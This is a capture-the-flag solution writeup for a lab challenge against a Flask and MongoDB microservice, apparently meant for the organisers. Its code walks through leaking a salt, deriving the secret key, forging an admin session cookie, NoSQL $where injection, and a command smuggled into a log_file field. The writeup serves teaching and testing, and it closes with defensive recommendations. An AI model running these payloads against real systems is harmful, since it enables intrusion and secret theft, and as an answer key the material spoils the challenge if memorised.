# Legacy Microservice Exploitation - Internal Writeup

## Challenge Overview

This challenge demonstrates a realistic attack chain involving:
1. Information disclosure
2. Secret derivation
3. Session forgery
4. NoSQL injection
5. Command injection

## Detailed Solution

### Stage 1: Service Discovery

Start by exploring the API:
```bash
curl http://target:5000/api/v2/services
```

This reveals three services: auth, api, and legacy (deprecated).

Enumerate the legacy service:
```bash
curl http://target:5000/api/v2/services/legacy/endpoints
```

### Stage 2-3: Secret Discovery

The legacy endpoints expose sensitive information:

1. Get the salt:
```bash
curl http://target:5000/api/legacy/get_salt
# Returns: {"salt": "CompanyName2025"}
```

2. Get system info:
```bash
curl http://target:5000/api/legacy/system_info
# Reveals: Flask, SecureCookie, sha256, 32-char keys
```

### Stage 4: Secret Derivation

Flask's default secret key derivation can be replicated:
```python
import hashlib
salt = "CompanyName2025"
secret_key = hashlib.sha256(salt.encode()).hexdigest()[:32]
# Result: 7c4a8d09ca3762af61e59520943dc264
```

### Stage 5: Session Forgery

Using itsdangerous (Flask's session library):
```python
from itsdangerous.url_safe import URLSafeTimedSerializer
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)
admin_session = {'role': 'admin', 'user': 'admin'}
admin_cookie = serializer.dumps(admin_session)
```

### Stage 6: Chained Exploitation

The `/api/admin/db/migrate` endpoint has two vulnerabilities:

1. **NoSQL Injection**: The `filter` parameter is passed directly to MongoDB:
```json
{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/tmp/test"
}
```

2. **Command Injection**: When NoSQL injection succeeds, the `log_file` parameter is vulnerable:
```json
{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/tmp/x; env | grep FLAG"
}
```

## Key Learning Points

1. **Legacy Systems**: Often contain forgotten vulnerabilities
2. **Information Disclosure**: Can lead to critical security breaches
3. **Session Security**: Depends on secret key confidentiality
4. **NoSQL Injection**: Different from SQL but equally dangerous
5. **Vulnerability Chains**: Multiple issues combined amplify impact

## Defensive Recommendations

1. Remove or properly secure legacy endpoints
2. Never expose cryptographic materials
3. Use environment-specific secrets
4. Sanitize all database queries
5. Validate and sanitize file paths
6. Implement proper access controls
7. Regular security audits

## Difficulty Notes

- **Normal Mode** (BLIND_RCE=false): Command output is returned
- **Hard Mode** (BLIND_RCE=true): Requires blind exploitation techniques

## Time-based Blind NoSQL Injection (Bonus)

For advanced players, time-based extraction is possible:
```javascript
{"$where": "function() {
    if (this.role == 'admin') {
        var start = Date.now();
        while(Date.now() - start < 5000) {}
    }
    return false;
}"}
```

This creates a 5-second delay if an admin user exists.

---

*This writeup is for internal use only. Do not distribute to participants.*
